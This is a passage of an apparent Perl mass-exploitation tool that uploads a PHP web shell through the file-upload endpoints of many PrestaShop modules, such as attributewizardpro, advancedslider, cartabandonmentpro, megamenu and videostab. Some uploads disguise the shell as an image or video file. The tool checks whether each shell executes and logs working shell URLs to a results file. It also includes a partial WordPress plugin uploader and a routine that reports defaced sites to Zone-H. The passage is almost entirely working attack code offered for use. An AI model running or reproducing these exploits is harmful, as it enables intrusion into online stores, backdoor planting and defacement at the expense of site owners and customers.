print TEXT "$jro_homepageadvertiseup\n";
close (TEXT);
}else{
print color('bold white'),"[jro_homepageadvertise]";
print color('bold white')," ............. ";
print color('bold red'),"[Failed]\n";
}
}

################ attributewizardpro #####################
sub attributewizardpro(){
my $url = "$site/modules/attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XBazooka.php"],]);

$attributewizardproup="$site/modules/attributewizardpro/file_uploads/XBazooka.php?X=Bazooka";

my $checkattributewizardpro = $ua->get("$attributewizardproup")->content;
if($checkattributewizardpro =~/X Bazooka/) {


print color('bold white'),"[attributewizardpro]";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $attributewizardproup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$attributewizardproup\n";
close (TEXT);
}else{
print color('bold white'),"[attributewizardpro]";
print color('bold white')," ................ ";
print color('bold red'),"[Failed]\n";
}
}

################ 1attributewizardpro #####################
sub oneattributewizardpro(){
my $url = "$site/modules/1attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XBazooka.php"],]);

$oneattributewizardproup="$site/modules/1attributewizardpro/file_uploads/XBazooka.php?X=Bazooka";

my $checkoneattributewizardpro = $ua->get("$oneattributewizardproup")->content;
if($checkoneattributewizardpro =~/X Bazooka/) {

print color('bold white'),"[1attributewizardpro]";
print color('bold white')," ............... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $oneattributewizardproup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$oneattributewizardproup\n";
close (TEXT);
}else{
print color('bold white'),"[1attributewizardpro]";
print color('bold white')," ............... ";
print color('bold red'),"[Failed]\n";
}
}

################ attributewizardpro.OLD #####################
sub attributewizardproOLD(){
my $url = "$site/modules/attributewizardpro.OLD/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XBazooka.php"],]);

$attributewizardproOLDup="$site/modules/attributewizardpro.OLD/file_uploads/XBazooka.php?X=Bazooka";

my $checkattributewizardproOLD = $ua->get("$attributewizardproOLDup")->content;
if($checkattributewizardproOLD =~/X Bazooka/) {

print color('bold white'),"[Attributewizardpro.OLD]";
print color('bold white')," ............ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $attributewizardproOLDup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$attributewizardproOLDup\n";
close (TEXT);
}else{
print color('bold white'),"[Attributewizardpro.OLD]";
print color('bold white')," ............ ";
print color('bold red'),"[Failed]\n";
}
}


################ attributewizardpro_x #####################
sub attributewizardpro_x(){
my $url = "$site/modules/attributewizardpro_x/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XBazooka.php"],]);

$attributewizardpro_xup="$site/modules/attributewizardpro_x/file_uploads/XBazooka.php?X=Bazooka";

my $checkattributewizardpro_x = $ua->get("$attributewizardpro_xup")->content;
if($checkattributewizardpro_x =~/X Bazooka/) {

print color('bold white'),"[attributewizardpro_x]";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $attributewizardpro_xup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$attributewizardpro_xup\n";
close (TEXT);
}else{
print color('bold white'),"[attributewizardpro_x]";
print color('bold white')," .............. ";
print color('bold red'),"[Failed]\n";
}
}

################ advancedslider #####################
sub advancedslider(){
my $url = "$site/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["XBazooka.php.png"],]);

$advancedsliderup="$site/modules/advancedslider/uploads/XBazooka.php.png?X=Bazooka";

my $checkadvancedslider = $ua->get("$advancedsliderup")->content;
if($checkadvancedslider =~/X Bazooka/) {


print color('bold white'),"[advancedslider]";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $advancedsliderup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$advancedsliderup\n";
close (TEXT);
}else{
print color('bold white'),"[advancedslider]";
print color('bold white')," .................... ";
print color('bold red'),"[Failed]\n";
}
}

################ cartabandonmentpro #####################
sub cartabandonmentpro(){
my $url = "$site/modules/cartabandonmentpro/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["XBazooka.php.png"],]);

$cartabandonmentproup="$site/modules/cartabandonmentpro/uploads/XBazooka.php.png?X=Bazooka";

my $checkcartabandonmentpro = $ua->get("$cartabandonmentproup")->content;
if($checkcartabandonmentpro =~/X Bazooka/) {

print color('bold white'),"[cartabandonmentpro]";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $cartabandonmentproup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$cartabandonmentproup\n";
close (TEXT);
}else{
print color('bold white'),"[cartabandonmentpro]";
print color('bold white')," ................ ";
print color('bold red'),"[Failed]\n";
}
}

################ cartabandonmentproOld #####################
sub cartabandonmentproOld(){
my $url = "$site/modules/cartabandonmentproOld/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["XBazooka.php.png"],]);

$cartabandonmentproOldup="$site/modules/cartabandonmentproOld/uploads/XBazooka.php.png?X=Bazooka";

my $checkcartabandonmentproOld = $ua->get("$cartabandonmentproOldup")->content;
if($checkcartabandonmentproOld =~/X Bazooka/) {
  
print color('bold white'),"[cartabandonmentproOld]";
print color('bold white')," ............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $cartabandonmentproOldup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$cartabandonmentproOldup\n";
close (TEXT);
}else{
print color('bold white'),"[cartabandonmentproOld]";
print color('bold white')," ............. ";
print color('bold red'),"[Failed]\n";
}
}

################ videostab #####################
sub videostab(){
my $url = "$site/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["XBazooka.php.mp4"],]);

$videostabup="$site/modules/videostab/uploads/XBazooka.php.mp4?X=Bazooka";

my $checkvideostab = $ua->get("$videostabup")->content;
if($checkvideostab =~/X Bazooka/) {


print color('bold white'),"[videostab]";
print color('bold white')," ......................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $videostabup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$videostabup\n";
close (TEXT);
}else{

print color('bold white'),"[videostab]";
print color('bold white')," ......................... ";
print color('bold red'),"[Failed]\n";
}
}

################ wg24themeadministration #####################
sub wg24themeadministration(){
my $url = "$site/modules//wg24themeadministration/wg24_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'pattern_upload', Content => [bajatax => ["XBazooka.php"],]);

$wg24themeadministrationup="$site/modules//wg24themeadministration///img/upload/XBazooka.php?X=Bazooka";

my $checkwg24themeadministration = $ua->get("$wg24themeadministrationup")->content;
if($checkwg24themeadministration =~/X Bazooka/) {


print color('bold white'),"[wg24themeadministration]";
print color('bold white')," ........... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wg24themeadministrationup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$wg24themeadministrationup\n";
close (TEXT);
}else{
print color('bold white'),"[wg24themeadministration]";
print color('bold white')," ........... ";
print color('bold red'),"[Failed]\n";
}
}

################ fieldvmegamenu #####################
sub fieldvmegamenu(){
my $url = "$site/modules/fieldvmegamenu/ajax/upload.php";
my $shell ="XBazooka.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$fieldvmegamenuup="$site/modules/fieldvmegamenu/uploads/XBazooka.php?X=Bazooka";

my $checkfieldvmegamenu = $ua->get("$fieldvmegamenuup")->content;
if($checkfieldvmegamenu =~/X Bazooka/) {


print color('bold white'),"[fieldvmegamenu]";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $fieldvmegamenuup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$fieldvmegamenuup\n";
close (TEXT);
}else{

print color('bold white'),"[fieldvmegamenu]";
print color('bold white')," .................... ";
print color('bold red'),"[Failed]\n";
}
}


################ wdoptionpanel #####################
sub wdoptionpanel(){
my $url = "$site/modules/wdoptionpanel/wdoptionpanel_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'image_upload', Content => [bajatax => ["XBazooka.php"],]);

$wdoptionpanelup="$site/modules/wdoptionpanel/upload/XBazooka.php?X=Bazooka";

my $checkwdoptionpanel = $ua->get("$wdoptionpanelup")->content;
if($checkwdoptionpanel =~/X Bazooka/) {


print color('bold white'),"[wdoptionpanel]";
print color('bold white')," ..................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wdoptionpanelup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$wdoptionpanelup\n";
close (TEXT);
}else{

print color('bold white'),"[wdoptionpanel]";
print color('bold white')," ..................... ";
print color('bold red'),"[Failed]\n";
}
}


################ pk_flexmenu #####################
sub pk_flexmenu(){
my $url = "$site/modules/pk_flexmenu/ajax/upload.php";
my $shell ="XBazooka.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_flexmenuup="$site/modules/pk_flexmenu/uploads/XBazooka.php?X=Bazooka";

my $checkpk_flexmenu = $ua->get("$pk_flexmenuup")->content;
if($checkpk_flexmenu =~/X Bazooka/) {


print color('bold white'),"[pk_flexmenu]";
print color('bold white')," ....................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $pk_flexmenuup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$pk_flexmenuup\n";
close (TEXT);
}else{
print color('bold white'),"[pk_flexmenu]";
print color('bold white')," ....................... ";
print color('bold red'),"[Failed]\n";
}
}

################ pk_vertflexmenu #####################
sub pk_vertflexmenu(){
my $url = "$site/modules/pk_vertflexmenu/ajax/upload.php";
my $shell ="XBazooka.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_vertflexmenuup="$site/modules/pk_vertflexmenu/uploads/XBazooka.php?X=Bazooka";

my $checkpk_vertflexmenu = $ua->get("$pk_vertflexmenuup")->content;
if($checkpk_vertflexmenu =~/X Bazooka/) {


print color('bold white'),"[pk_vertflexmenu]";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $pk_vertflexmenuup\n";

open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$pk_vertflexmenuup\n";
close (TEXT);
}else{
print color('bold white'),"[pk_vertflexmenu]";
print color('bold white')," ................... ";
print color('bold red'),"[Failed]\n";
}
}

################ nvn_export_orders #####################
sub nvn_export_orders(){
my $url = "$site/modules/nvn_export_orders/upload.php";
my $shell ="nvn_extra_add.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$nvn_export_ordersup="$site/modules/nvn_export_orders/nvn_extra_add.php?X=Bazooka";

my $checknvn_export_orders = $ua->get("$nvn_export_ordersup")->content;
if($checknvn_export_orders =~/X Bazooka/) {


print color('bold white'),"[nvn_export_orders]";
print color('bold white')," ................. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $nvn_export_ordersup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$nvn_export_ordersup\n";
close (TEXT);
}else{
print color('bold white'),"[nvn_export_orders]";
print color('bold white')," ................. ";
print color('bold red'),"[failed]\n";
}
}

################ megamenu #####################
sub megamenu(){
my $url = "$site/modules/megamenu/uploadify/uploadify.php?id=XBazooka.php";
my $shell ="XBazooka.php.png";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$megamenuup="$site/XBazooka.php.png?X=Bazooka";

my $checkmegamenu = $ua->get("$megamenuup")->content;
if($checkmegamenu =~/X Bazooka/) {


print color('bold white'),"[megamenu]";
print color('bold white')," .......................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $megamenuup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$megamenuup\n";
close (TEXT);
}else{
print color('bold white'),"[megamenu]";
print color('bold white')," .......................... ";
print color('bold red'),"[Failed]\n";
}
}

################ tdpsthemeoptionpanel #####################
sub tdpsthemeoptionpanel(){
my $url = "$site/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php";
my $shell ="XBazooka.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$tdpsthemeoptionpanelup="$site/modules/tdpsthemeoptionpanel/upload/XBazooka.php?X=Bazooka";

my $checktdpsthemeoptionpanel = $ua->get("$tdpsthemeoptionpanelup")->content;
if($checktdpsthemeoptionpanel =~/X Bazooka/) {

print color('bold white'),"[tdpsthemeoptionpanel]";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $tdpsthemeoptionpanelup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$tdpsthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold white'),"[tdpsthemeoptionpanel]";
print color('bold white')," .............. ";
print color('bold red'),"[Failed]\n";
}
}


################ psmodthemeoptionpanel #####################
sub psmodthemeoptionpanel(){
my $url = "$site/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php";
my $shell ="XBazooka.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$psmodthemeoptionpanelup="$site/modules/psmodthemeoptionpanel/upload/XBazooka.php?X=Bazooka";

my $checkpsmodthemeoptionpanel = $ua->get("$psmodthemeoptionpanelup")->content;
if($checkpsmodthemeoptionpanel =~/X Bazooka/) {


print color('bold white'),"[psmodthemeoptionpanel]";
print color('bold white')," ............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $psmodthemeoptionpanelup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$psmodthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold white'),"[psmodthemeoptionpanel]";
print color('bold white')," ............. ";
print color('bold red'),"[Failed]\n";
}
}


################ masseditproduct #####################
sub masseditproduct(){
my $url = "$site/modules/lib/redactor/file_upload.php";
my $shell ="XBazooka.php";
my $field_name = "file";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$masseditproductup="$site/masseditproduct/uploads/file/XBazooka.php?X=Bazooka";

my $checkmasseditproduct = $ua->get("$masseditproductup")->content;
if($checkmasseditproduct =~/X Bazooka/) {

print color('bold white'),"[masseditproduct]";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $masseditproductup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$masseditproductup\n";
close (TEXT);
}else{
print color('bold white'),"[masseditproduct]";
print color('bold white')," ................... ";
print color('bold red'),"[Failed]\n";
}
}


######




######### check shell and index 

sub shekk(){
my $shcheck = $ua->get("$upl")->content;
if($shcheck =~/Wissem Mahfoud/) {
   print color('bold red');
print "[Success]\n";
    print color('reset');


    open(save, '>>Result/Shell3z.txt');   
    print save "$shell\n";   
    close(save);






}else{   print color('bold red');
print "[Failed]\n";
    print color('reset');}
}
################virula####


#### not complete yet :( ....

sub virulaoption(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link = $site."/wp-content/plugins/viral-optins/api/uploader/file-uploader.php";
print "trying ==> $site\n";
sub upza(){
my $url = "$site/wp-content/plugins/viral-optins/api/uploader/file-uploader.php";
my $filename ="bazooka.txt"; 
my $filenamex = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $filenamex => ["$filename"] ]
           
            );
$upzzspy = $site. '/wp-content/uploads/2017/08/bazooka.txt'; 
my $taz = $ua->get("$upzzspy")->content;
if ($taz =~ /Mahfoud/){
   print color('bold green');
print "[Success]\n";
    print color('reset');
open(save, '>>Result/index.txt');   
print save "$upzzspy\n";   
close(save);
}else{
print color('bold red');
print "...Failed :(\n";
    print color('reset');

}
    upza();
}
}
#######################

######################
######################
######################
#####  Zone-H   ######
######################
######################
######################
sub zoneh(){
print color('bold white'),"[Zone-h Poster] ...................... ";

    open(save, '>>Result/index.txt');
    print save "$def\n";
    close(save);

                                $hack="";
                                $zn="";
                                $lwp=LWP::UserAgent->new;
                                $res=$lwp  -> post($zn,[
                                'defacer'     => $hack,
                                'domain1'   => $def,
                                'hackmode' => '15',
                                'reason'       => '1',
                                'submit'       => 'Send',
                                ]);
                                if ($res->content =~ /color="red">ERROR<\/font><\/li>/) {
   print color('bold red');
print "[Failed]\n";
    print color('reset');

                                }
                                elsif ($res->content =~ /color="red">OK<\/font><\/li>/) {
   print color('bold green');
print "[Success]\n";
    print color('reset');



                                }
                                else
                                {
   print color('bold red');
print "[Failed]\n";
    print color('reset');
                                }
                            }
							
}
